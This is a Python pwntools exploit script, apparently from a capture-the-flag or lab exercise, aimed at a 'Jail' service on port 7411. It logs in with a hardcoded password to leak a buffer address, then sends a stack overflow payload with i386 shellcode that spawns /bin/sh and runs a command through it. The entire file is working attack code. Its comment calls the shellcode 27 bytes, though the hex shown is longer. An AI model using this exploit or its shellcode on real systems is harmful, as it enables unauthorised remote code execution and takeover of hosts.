#!/usr/bin/env python3
"""diag.py - raw debugging of the Jail overflow (no interactive)."""
import sys
from pwn import *  # noqa: F403
import time

context.update(arch="i386", os="linux", log_level="error")
HOST = sys.argv[1] if len(sys.argv) > 1 else "10.129.63.36"

# Connection 1: Leak
conn = remote(HOST, 7411, timeout=10)
conn.recvuntil(b"Send USER command.")
conn.sendline(b"DEBUG")
conn.recvuntil(b"DEBUG mode on.")
conn.sendline(b"USER admin")
conn.recvuntil(b"Send PASS command.")
conn.sendline(b"PASS 1974jailbreak!")
conn.recvuntil(b"userpass buffer @ ")
raw = conn.recvline().strip()
base = int(raw, 16)
conn.close()
print(f"[+] leak: {hex(base)}")

# Shellcode (27 bytes)
SHELL_BYTES = bytes.fromhex(
    "6a3f586a015b31c9cd806a0b589952682f2f7368682f62696e89e331c9cd80"
)
payload = b"A" * 28 + p32(base + 32) + SHELL_BYTES

conn = remote(HOST, 7411, timeout=10)
conn.recvuntil(b"Send USER command.")
conn.sendline(b"USER admin")
conn.recvuntil(b"Send PASS command.")
conn.sendline(b"PASS " + payload)

time.sleep(1)
# send a command then read everything for a few seconds
try:
    conn.send(b"id; echo MARKER_DONE\n")
except Exception as e:
    print("send err", e)
try:
    data = conn.recv(timeout=6)
    print("RECV:", repr(data))
except Exception as e:
    print("recv err:", e)
conn.close()
